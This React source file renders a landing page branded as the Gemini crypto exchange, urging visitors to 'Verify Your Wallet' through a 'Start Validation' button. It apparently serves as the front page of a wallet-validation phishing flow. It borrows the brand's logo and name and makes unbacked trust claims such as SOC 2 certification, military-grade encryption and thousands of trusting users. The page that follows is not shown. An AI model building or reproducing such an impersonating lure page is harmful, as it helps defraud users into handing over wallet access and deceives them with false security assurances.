import React from 'react';
import { ArrowRight, Shield, Lock, CheckCircle, Zap, Globe, Eye } from 'lucide-react';
import { useNavigate } from "react-router-dom";
import './geminiHome.css';
import geminiLogo from "../../assets/gemini_logo.png";

const GeminiLanding = () => {
  const navigate = useNavigate();

  return (
    <div className="gemini-container">
      {/* Navigation */}
      <nav className="gemini-navbar">
        <div className="gemini-nav-content">
          <img 
            src={geminiLogo} 
            alt="Gemini Logo" 
            className="gemini-logo-img" 
          />
        </div>
      </nav>

      {/* Hero Section */}
      <section className="gemini-hero">
        <div className="gemini-hero-bg-effect"></div>
        
        <div className="gemini-hero-content">
          <div className="gemini-hero-badge">
            <div className="gemini-badge-dot"></div>
            <span>Secure Wallet Validation</span>
          </div>
          
          <h1 className="gemini-hero-title">
            Verify Your Wallet
            <br />
            <span className="gemini-gradient-text">With Confidence</span>
          </h1>
          
          <p className="gemini-hero-subtitle">
            Validate wallet ownership using industry-leading security protocols. 
            No private keys required—your assets remain fully protected.
          </p>
          
          <button
            className="gemini-btn gemini-btn-primary"
            onClick={() => navigate("/gemini-landing")}
          >
            Start Validation
            <ArrowRight className="gemini-btn-icon" />
          </button>

          {/* Floating Cards */}
          <div className="gemini-floating-cards">
            <div className="gemini-float-card">
              <Shield className="gemini-card-icon" />
              <div className="gemini-card-info">
                <div className="gemini-card-label">Secure</div>
                <div className="gemini-card-value">256-bit encryption</div>
              </div>
            </div>
            
            <div className="gemini-float-card">
              <Zap className="gemini-card-icon" />
              <div className="gemini-card-info">
                <div className="gemini-card-label">Fast</div>
                <div className="gemini-card-value">Instant verification</div>
              </div>
            </div>
            
            <div className="gemini-float-card">
              <Lock className="gemini-card-icon" />
              <div className="gemini-card-info">
                <div className="gemini-card-label">Private</div>
                <div className="gemini-card-value">Zero-knowledge</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="gemini-features-section">
        <div className="gemini-section-header">
          <h2 className="gemini-section-title">Built for Security-First Validation</h2>
          <p className="gemini-section-description">
            Institutional-grade protection for your crypto assets
          </p>
        </div>

        <div className="gemini-features-grid">
          <div className="gemini-feature-box">
            <div className="gemini-feature-icon-wrapper">
              <Shield className="gemini-feature-icon" />
            </div>
            <h3 className="gemini-feature-title">Non-Custodial Verification</h3>
            <p className="gemini-feature-text">
              Validate wallet ownership without ever exposing private keys or seed phrases. Your assets remain under your complete control.
            </p>
          </div>

          <div className="gemini-feature-box">
            <div className="gemini-feature-icon-wrapper">
              <Eye className="gemini-feature-icon" />
            </div>
            <h3 className="gemini-feature-title">Privacy-Preserving Protocol</h3>
            <p className="gemini-feature-text">
              Zero-knowledge verification ensures your wallet details remain confidential throughout the validation process.
            </p>
          </div>

          <div className="gemini-feature-box">
            <div className="gemini-feature-icon-wrapper">
              <Lock className="gemini-feature-icon" />
            </div>
            <h3 className="gemini-feature-title">Multi-Layer Security</h3>
            <p className="gemini-feature-text">
              Bank-level encryption combined with advanced cryptographic techniques to protect every validation request.
            </p>
          </div>

          <div className="gemini-feature-box">
            <div className="gemini-feature-icon-wrapper">
              <Zap className="gemini-feature-icon" />
            </div>
            <h3 className="gemini-feature-title">Instant Confirmation</h3>
            <p className="gemini-feature-text">
              Real-time validation with immediate confirmation. Complete the process in seconds, not minutes.
            </p>
          </div>
        </div>
      </section>

      {/* Security Showcase */}
      <section className="gemini-security-section">
        <div className="gemini-security-content">
          <div className="gemini-security-visual">
            <div className="gemini-security-badge-large">
              <Lock className="gemini-badge-icon-large" />
            </div>
          </div>
          
          <div className="gemini-security-text">
            <h2 className="gemini-security-title">Your Security is Our Priority</h2>
            <p className="gemini-security-description">
              We've implemented the same security standards trusted by leading financial institutions to protect your wallet validation process.
            </p>
            
            <div className="gemini-security-features">
              <div className="gemini-security-item">
                <CheckCircle className="gemini-check-icon" />
                <span>Military-grade 256-bit encryption</span>
              </div>
              <div className="gemini-security-item">
                <CheckCircle className="gemini-check-icon" />
                <span>SOC 2 Type II certified infrastructure</span>
              </div>
              <div className="gemini-security-item">
                <CheckCircle className="gemini-check-icon" />
                <span>Never store private keys or passwords</span>
              </div>
              <div className="gemini-security-item">
                <CheckCircle className="gemini-check-icon" />
                <span>Real-time fraud detection systems</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="gemini-cta-section">
        <div className="gemini-cta-content">
          <h2 className="gemini-cta-title">Ready to Validate Your Wallet?</h2>
          <p className="gemini-cta-text">
            Join thousands of users who trust our secure validation process.
          </p>
          <button
            className="gemini-btn gemini-btn-cta"
            onClick={() => navigate("/gemini-landing")}
          >
            Begin Validation
            <ArrowRight className="gemini-btn-icon" />
          </button>
        </div>
      </section>

      {/* Footer */}
      <footer className="gemini-footer">
        <div className="gemini-footer-content">
          <div className="gemini-footer-section gemini-footer-main">
            <img 
              src={geminiLogo} 
              alt="Gemini Logo" 
              className="gemini-logo-footer-img" 
            />
            <p className="gemini-footer-description">
              Secure wallet validation built on trust and transparency.
            </p>
          </div>
        </div>

        <div className="gemini-footer-bottom">
          <p>© 2025 Gemini. All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
};

export default GeminiLanding;